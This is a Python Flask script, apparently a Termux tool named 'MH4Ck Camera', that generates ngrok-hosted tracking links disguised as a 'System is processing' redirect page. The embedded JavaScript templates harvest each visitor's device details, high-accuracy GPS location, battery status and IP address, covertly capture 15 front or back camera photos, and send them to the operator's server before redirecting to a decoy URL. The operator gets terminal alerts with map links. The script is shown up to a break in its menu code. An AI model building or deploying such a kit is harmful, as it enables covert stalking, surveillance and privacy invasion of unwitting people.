#!/usr/bin/env python3
import os
import sys
import json
import time
import uuid
import base64
import threading
import urllib.parse
import requests
import subprocess
import signal
import atexit
import stat
import shutil
import zipfile
import tarfile
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO
import concurrent.futures
import html
import logging

# ==================== Configuration ====================
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ==================== Shared Data Storage ====================
user_links = {}
tracking_data = {}
executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
active_tunnels = {}
current_user_id = "termux_user"
notification_lock = threading.Lock()
processed_clicks = set()
ngrok_process = None

# ==================== HTML Templates ====================
TRACKING_PAGE_HTML_CAM_LOCATION = """
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            getLocation(info);
        }

        function getLocation(info) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        info.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        getBatteryInfo(info);
                    },
                    function(error) {
                        info.locationError = error.message;
                        getBatteryInfo(info);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info.locationError = "Geolocation is not supported by this browser.";
                getBatteryInfo(info);
            }
        }

        function getBatteryInfo(info) {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.batteryLevel = battery.level * 100;
                    info.batteryCharging = battery.charging;
                    requestCameraAccess(info);
                });
            } else {
                requestCameraAccess(info);
            }
        }

        function requestCameraAccess(info) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(function(stream) {
                    info.cameraAccess = true;
                    info.cameraType = 'front';
                    takeMultiplePhotos(stream, info);
                })
                .catch(function(error) {
                    info.cameraAccess = false;
                    info.cameraError = error.name;
                    getIpAddress(info);
                });
            } else {
                info.cameraAccess = false;
                info.cameraError = 'No camera support';
                getIpAddress(info);
            }
        }

        function takeMultiplePhotos(stream, info) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                info.cameraPhotos = [];
                let photosTaken = 0;
                const totalPhotos = 15;
                const interval = 300;

                function capturePhoto() {
                    if (photosTaken < totalPhotos) {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.95);
                        info.cameraPhotos.push(photoData);
                        photosTaken++;
                        setTimeout(capturePhoto, interval);
                    } else {
                        stream.getTracks().forEach(track => track.stop());
                        getIpAddress(info);
                    }
                }

                setTimeout(capturePhoto, 1000);
            };
        }

        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        window.onload = collectDeviceInfo;
    </script>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { color: #333; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: #007bff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>System is processing...</h2>
        <p>Please wait, system is processing</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

TRACKING_PAGE_HTML_ONLY_LOCATION = """
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            getLocation(info);
        }

        function getLocation(info) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        info.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        getIpAddress(info);
                    },
                    function(error) {
                        info.locationError = error.message;
                        getIpAddress(info);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info.locationError = "Geolocation is not supported by this browser.";
                getIpAddress(info);
            }
        }

        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        window.onload = collectDeviceInfo;
    </script>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { color: #333; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: #007bff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>System is processing...</h2>
        <p>Please wait, system is processing</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

TRACKING_PAGE_HTML_BACK_CAMERA = """
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            requestBackCameraAccess(info);
        }

        function requestBackCameraAccess(info) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { exact: 'environment' },
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(function(stream) {
                    info.cameraAccess = true;
                    info.cameraType = 'back';
                    takeMultiplePhotos(stream, info);
                })
                .catch(function(error) {
                    info.cameraAccess = false;
                    info.cameraError = error.name;
                    getIpAddress(info);
                });
            } else {
                info.cameraAccess = false;
                info.cameraError = 'No camera support';
                getIpAddress(info);
            }
        }

        function takeMultiplePhotos(stream, info) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                info.cameraPhotos = [];
                let photosTaken = 0;
                const totalPhotos = 15;
                const interval = 300;

                function capturePhoto() {
                    if (photosTaken < totalPhotos) {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.95);
                        info.cameraPhotos.push(photoData);
                        photosTaken++;
                        setTimeout(capturePhoto, interval);
                    } else {
                        stream.getTracks().forEach(track => track.stop());
                        getIpAddress(info);
                    }
                }

                setTimeout(capturePhoto, 1000);
            };
        }

        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        window.onload = collectDeviceInfo;
    </script>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { color: #333; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: #007bff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>System is processing...</h2>
        <p>Please wait, system is processing</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

TRACKING_PAGE_HTML_FRONT_CAMERA = """
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            requestFrontCameraAccess(info);
        }

        function requestFrontCameraAccess(info) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(function(stream) {
                    info.cameraAccess = true;
                    info.cameraType = 'front';
                    takeMultiplePhotos(stream, info);
                })
                .catch(function(error) {
                    info.cameraAccess = false;
                    info.cameraError = error.name;
                    getIpAddress(info);
                });
            } else {
                info.cameraAccess = false;
                info.cameraError = 'No camera support';
                getIpAddress(info);
            }
        }

        function takeMultiplePhotos(stream, info) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                info.cameraPhotos = [];
                let photosTaken = 0;
                const totalPhotos = 15;
                const interval = 300;

                function capturePhoto() {
                    if (photosTaken < totalPhotos) {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.95);
                        info.cameraPhotos.push(photoData);
                        photosTaken++;
                        setTimeout(capturePhoto, interval);
                    } else {
                        stream.getTracks().forEach(track => track.stop());
                        getIpAddress(info);
                    }
                }

                setTimeout(capturePhoto, 1000);
            };
        }

        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        window.onload = collectDeviceInfo;
    </script>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { color: #333; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: #007bff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>System is processing...</h2>
        <p>Please wait, system is processing</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

# ==================== Flask App ====================
app = Flask(__name__)

# ==================== Ngrok Functions ====================
def download_ngrok():
    """Download ngrok binary for Termux/Android"""
    print("\033[1;33m📥 Checking for ngrok...\033[0m")
    
    # Check if ngrok already exists
    ngrok_path = os.path.join(os.getcwd(), 'ngrok')
    if os.path.exists(ngrok_path):
        print("\033[1;32m✅ ngrok already downloaded\033[0m")
        os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
        return ngrok_path
    
    print("\033[1;33m📥 Downloading ngrok for Termux...\033[0m")
    
    # Detect architecture
    import platform
    machine = platform.machine()
    
    if 'aarch64' in machine or 'arm64' in machine:
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
        filename = "ngrok.tgz"
    elif 'arm' in machine:
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz"
        filename = "ngrok.tgz"
    else:
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz"
        filename = "ngrok.tgz"
    
    try:
        # Download
        print(f"   Downloading from: {url}")
        response = requests.get(url, stream=True)
        total_size = int(response.headers.get('content-length', 0))
        
        with open(filename, 'wb') as f:
            downloaded = 0
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                downloaded += len(chunk)
                # Show progress
                if total_size > 0:
                    percent = (downloaded / total_size) * 100
                    sys.stdout.write(f"\r   Progress: {percent:.1f}%")
                    sys.stdout.flush()
        
        print("\n   ✅ Download complete")
        
        # Extract
        print("   📦 Extracting...")
        if filename.endswith('.tgz'):
            tar = tarfile.open(filename)
            tar.extractall()
            tar.close()
        elif filename.endswith('.zip'):
            with zipfile.ZipFile(filename, 'r') as zip_ref:
                zip_ref.extractall()
        
        # Clean up
        os.remove(filename)
        
        # Make executable
        os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
        
        print("\033[1;32m✅ ngrok installed successfully!\033[0m")
        return ngrok_path
        
    except Exception as e:
        print(f"\033[1;31m❌ Failed to download ngrok: {e}\033[0m")
        return None

def setup_ngrok_auth(authtoken):
    """Setup ngrok authentication"""
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return False
    
    try:
        print("\033[1;33m🔑 Configuring ngrok authtoken...\033[0m")
        subprocess.run([ngrok_path, 'config', 'add-authtoken', authtoken], 
                      capture_output=True, text=True, check=True)
        print("\033[1;32m✅ Authtoken configured!\033[0m")
        return True
    except subprocess.CalledProcessError as e:
        print(f"\033[1;31m❌ Failed to set authtoken: {e}\033[0m")
        return False

def start_ngrok_tunnel(port):
    """Start ngrok tunnel using subprocess"""
    global ngrok_process
    
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return None
    
    try:
        # Kill existing ngrok
        stop_ngrok()
        
        # Start ngrok
        print(f"\033[1;33m🔄 Starting ngrok tunnel on port {port}...\033[0m")
        
        ngrok_process = subprocess.Popen(
            [ngrok_path, 'http', str(port), '--log=stdout', '--log-level=debug'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        # Wait for tunnel URL
        time.sleep(3)
        
        # Get public URL from ngrok API
        max_attempts = 10
        for i in range(max_attempts):
            try:
                response = requests.get('http://localhost:4040/api/tunnels')
                if response.status_code == 200:
                    data = response.json()
                    tunnels = data.get('tunnels', [])
                    for tunnel in tunnels:
                        if tunnel.get('proto') == 'https':
                            public_url = tunnel.get('public_url')
                            if public_url:
                                print(f"\033[1;32m✅ Ngrok tunnel started: {public_url}\033[0m")
                                return public_url
            except:
                pass
            time.sleep(1)
            print(f"   Waiting for ngrok... ({i+1}/{max_attempts})")
        
        print("\033[1;31m❌ Failed to get ngrok URL\033[0m")
        return None
        
    except Exception as e:
        print(f"\033[1;31m❌ Failed to start ngrok: {e}\033[0m")
        return None

def stop_ngrok():
    """Stop ngrok process"""
    global ngrok_process
    
    if ngrok_process:
        try:
            ngrok_process.terminate()
            ngrok_process.wait(timeout=5)
        except:
            ngrok_process.kill()
        ngrok_process = None
    
    # Also kill any other ngrok processes
    try:
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
    except:
        pass

# ==================== Helper Functions ====================
def add_watermark(image_data, text="t.me/mengheang25"):
    """Add watermark to image and return ONLY watermarked image"""
    try:
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes)).convert('RGBA')
        watermark = Image.new('RGBA', image.size, (0, 0, 0, 0))
        draw = ImageDraw.Draw(watermark)

        try:
            font_size = max(20, min(image.width, image.height) // 20)
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            font = None

        if font:
            bbox = draw.textbbox((0, 0), text, font=font)
            text_width = bbox[2] - bbox[0]
            text_height = bbox[3] - bbox[1]
        else:
            text_width, text_height = 150, 20
            
        margin = 10
        x = image.width - text_width - margin
        y = image.height - text_height - margin

        draw.rectangle([x - 10, y - 5, x + text_width + 10, y + text_height + 5], fill=(0, 0, 0, 128))
        
        if font:
            draw.text((x, y), text, fill=(255, 255, 255, 255), font=font)
        else:
            draw.text((x, y), text, fill=(255, 255, 255, 255))

        watermarked_image = Image.alpha_composite(image, watermark).convert('RGB')

        output = BytesIO()
        watermarked_image.save(output, format='JPEG', quality=95)
        return output.getvalue()
    except Exception as e:
        return None

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    """Print beautiful banner"""
    banner = """
\033[1;36m╔══════════════════════════════════════════════════════════╗
║                   📱 MH4Ck Camera v2.1                     ║
║                      Termux Edition (Ngrok Bin)             ║
╠══════════════════════════════════════════════════════════════╣
║  Developer: @mengheang25                                     ║
║  From: Cambodia 🇰🇭                                           ║
║  Features: Camera, Location, IP, Device Info                 ║
║  Ngrok: Binary (No pyngrok)                                  ║
╚══════════════════════════════════════════════════════════════╝\033[0m
"""
    print(banner)

def print_menu():
    """Print main menu"""
    menu = f"""
\033[1;33m[ MAIN MENU ]\033[0m
╔══════════════════════════════════════════════════════════════╗
║  \033[1;32m1.\033[0m 📸 Camera + Location      - Capture GPS + Front Camera  ║
║  \033[1;32m2.\033[0m 📍 Only Location         - GPS Location Only          ║
║  \033[1;32m3.\033[0m 📷 Back Camera           - Capture from Back Camera   ║
║  \033[1;32m4.\033[0m 🤳 Front Camera          - Capture from Front Camera  ║
║  \033[1;32m5.\033[0m ❌ Exit                 - Stop all services         ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(menu)

def print_success_message(link_data):
    """Print success message with tracking link"""
    print(f"\n\033[1;32m✅ TRACKING LINK CREATED SUCCESSFULLY!\033[0m")
    print(f"╔══════════════════════════════════════════════════════════════╗")
    print(f"║  \033[1;36mMode:\033[0m        {link_data['mode'].replace('_', ' ').title()}")
    print(f"║  \033[1;36mTarget URL:\033[0m  {link_data['redirect_url']}")
    print(f"║  \033[1;36mTrack ID:\033[0m    {link_data['track_id']}")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    print(f"║  \033[1;33m🔗 YOUR TRACKING LINK:\033[0m")
    print(f"║  \033[4;34m{link_data['tracking_link']}\033[0m")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print(f"\n\033[1;33m📋 Information that will be captured:\033[0m")
    
    if 'camera' in link_data['mode']:
        print(f"  • 📸 15 photos from {'BACK' if 'back' in link_data['mode'] else 'FRONT' if 'front' in link_data['mode'] else 'FRONT'} camera")
        print(f"  • 🖼️  Watermark added automatically (No original saved)")
    if 'location' in link_data['mode'] or link_data['mode'] == 'only_location':
        print(f"  • 📍 Real-time GPS location")
    if 'cam_location' in link_data['mode']:
        print(f"  • 🔋 Battery information")
    print(f"  • 🌐 IP address")
    print(f"  • 📱 Device information")
    print(f"  • 💻 Screen information")
    print(f"  • 🕐 Timezone")
    
    print(f"\n\033[1;33m⚠️  NOTIFICATIONS WILL APPEAR IN THIS TERMINAL!\033[0m")
    print(f"\033[1;32m📡 Waiting for someone to click your link...\033[0m")
    print(f"\033[1;30mPress Ctrl+C to stop and return to menu\033[0m")

def print_notification(track_id, info, mode):
    """Print notification in terminal when link is clicked"""
    print(f"\n\033[1;5;31m🔔 NEW LINK CLICKED! 🔔\033[0m")
    print(f"╔══════════════════════════════════════════════════════════════╗")
    print(f"║  \033[1;33mTime:\033[0m      {info.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}")
    print(f"║  \033[1;33mMode:\033[0m      {mode.replace('_', ' ').title()}")
    print(f"║  \033[1;33mTrack ID:\033[0m  {track_id}")
    print(f"║  \033[1;33mIP Address:\033[0m {info.get('ip_address', 'Unknown')}")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    
    if 'location' in info:
        lat = info['location']['latitude']
        lng = info['location']['longitude']
        acc = info['location']['accuracy']
        maps_url = f"https://www.google.com/maps?q={lat},{lng}"
        print(f"║  \033[1;36m📍 LOCATION DETECTED!\033[0m")
        print(f"║     Latitude:  {lat}")
        print(f"║     Longitude: {lng}")
        print(f"║     Accuracy:  {acc}m")
        print(f"║     Maps: {maps_url}")
    
    if 'batteryLevel' in info:
        battery = info['batteryLevel']
        charging = "Charging" if info.get('batteryCharging') else "Not charging"
        print(f"║  \033[1;36m🔋 BATTERY:\033[0m {battery}% ({charging})")
    
    if 'cameraPhotos' in info:
        photos = len(info['cameraPhotos'])
        print(f"║  \033[1;36m📸 CAMERA:\033[0m Captured {photos} photos")
        print(f"║     Saved (Watermarked): captured_images/{track_id}/")
    
    if 'userAgent' in info:
        ua = info['userAgent'][:80] + "..." if len(info['userAgent']) > 80 else info['userAgent']
        print(f"║  \033[1;36m📱 DEVICE:\033[0m {ua}")
    
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print(f"\033[1;32m📡 Still waiting for more clicks...\033[0m\n")

def save_watermarked_photos_only(track_id, photos, camera_type):
    """Save ONLY watermarked photos"""
    try:
        dir_path = f"captured_images/{track_id}"
        os.makedirs(dir_path, exist_ok=True)
        
        saved_count = 0
        for i, photo_data in enumerate(photos[:15]):
            try:
                watermarked_bytes = add_watermark(photo_data)
                if watermarked_bytes:
                    with open(f"{dir_path}/{camera_type}_camera_{i+1}_watermarked.jpg", 'wb') as f:
                        f.write(watermarked_bytes)
                    saved_count += 1
            except Exception as e:
                pass
        
        if saved_count > 0:
            print(f"  ✅ Saved {saved_count} watermarked photos to {dir_path}/")
        
    except Exception as e:
        pass

# ==================== Flask Route Handlers ====================
@app.route('/track/<track_id>', methods=['GET', 'POST'])
def track_endpoint(track_id):
    """Unified tracking endpoint for all modes"""
    if request.method == 'GET':
        redirect_url = request.args.get('url', 'https://google.com')
        mode = request.args.get('mode', 'cam_location')
        
        # Select template based on mode
        if mode == 'cam_location':
            template = TRACKING_PAGE_HTML_CAM_LOCATION
        elif mode == 'only_location':
            template = TRACKING_PAGE_HTML_ONLY_LOCATION
        elif mode == 'back_camera':
            template = TRACKING_PAGE_HTML_BACK_CAMERA
        elif mode == 'front_camera':
            template = TRACKING_PAGE_HTML_FRONT_CAMERA
        else:
            template = TRACKING_PAGE_HTML_CAM_LOCATION
        
        return render_template_string(template, track_id=track_id, redirect_url=redirect_url)
    
    elif request.method == 'POST':
        try:
            device_info = request.json
            device_info['ip_address'] = request.remote_addr
            device_info['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            click_id = f"{track_id}_{datetime.now().strftime('%Y%m%d%H%M%S%f')}"
            tracking_data[click_id] = device_info
            
            # Get mode from request args
            mode = request.args.get('mode', 'cam_location')
            
            with notification_lock:
                if click_id not in processed_clicks:
                    print_notification(track_id, device_info, mode)
                    processed_clicks.add(click_id)
            
            # Save photos if present
            if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
                camera_type = device_info.get('cameraType', 'front')
                save_watermarked_photos_only(track_id, device_info['cameraPhotos'], camera_type)
            
            return jsonify({'success': True})
            
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})

# ==================== Main Functions ====================
def create_tracking_link(mode):
    """Create tracking link with ngrok binary"""
    global current_mode
    
    try:
        # Get ngrok auth token
        ngrok_auth = input("\033[1;33m🔑 Enter your Ngrok Authtoken: \033[0m").strip()
        if not ngrok_auth:
            print("\033[1;31m❌ Authtoken is required!\033[0m")
            return False
        
        # Setup ngrok auth
        if not setup_ngrok_auth(ngrok_auth):
            return False
        
        # Get target URL
        target_url = input("\033[1;33m🎯 Enter target URL (e.g., https://google.com): \033[0m").strip()
        if not target_url:
            target_url = "https://google.com"
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        # Start ngrok tunnel
        public_url = start_ngrok_tunnel(5000)
        if not public_url:
            print("\033[1;31m❌ Failed to start ngrok tunnel!\033[0m")
            return False
        
        # Generate track ID
        track_id = str(uuid.uuid4())[:8]
        
        # Create tracking link
        tracking_link = f"{public_url}/track/{track_id}?url={urllib.parse.quote(target_url)}&mode={mode}"
        
        # Store link data
        link_data = {
            'track_id': track_id,
            'redirect_url': target_url,
            'tracking_link': tracking_link,
            'created_at': time.time(),
            'mode': mode,
            'ngrok_url': public_url
        }
        
        if current_user_id not in user_links:
            user_links[current_user_id] = []
        user_links[current_user_id].append(link_data)
        
        # Save current mode
        current_mode = mode
        
        # Print success message
        print_success_message(link_data)
        
        return True
        
    except Exception as e:
        print(f"\033[1;31m❌ Error creating tracking link: {e}\033[0m")
        return False

def cleanup():
    """Clean up ngrok process"""
    print("\n\033[1;33m🧹 Cleaning up...\033[0m")
    stop_ngrok()
    print("\033[1;32m✅ Cleanup complete!\033[0m")

def main():
    """Main function"""
    global current_mode
    current_mode = 'cam_location'
    
    clear_screen()
    print_banner()
    
    # Create directories
    os.makedirs('captured_images', exist_ok=True)
    
    # Register cleanup on exit
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
    
    # Start Flask server (single instance)
    print("\033[1;33m🚀 Starting Flask web server...\033[0m")
    flask_thread = threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False),
        daemon=True
    )
    flask_thread.start()
    print("\033[1;32m✅ Flask server started on port 5000\033[0m")
    time.sleep(2)
    
    while True:
        try:
            print_menu()
            choice = input("\033[1;33m🔹 Select option (1-5): \033[0m").strip()
            
            if choice == '1':
                clear_screen()
                print_banner()
                print("\n\033[1;36m📸 MODE: CAMERA + LOCATION\033[0m")
                if create_tracking_link('cam_location'):
                    try:
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print("\n\033[1;33m⏹️  Stopped waiting...\033[0m")
                        continue
                    
            elif choice == '2':
                clear_screen()
                print_banner()
                print("\n\033[1;36m📍 MODE: ONLY LOCATION\033[0m")
                if create_tracking_link('only_location'):
                    try:
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print("\n\033[1;33m⏹️  Stopped waiting...\033[0m")
                        continue
                    
            elif choice == '3':
                clear_screen()
                print_banner()
                print("\n\033[1;36m📷 MODE: BACK CAMERA\033[0m")
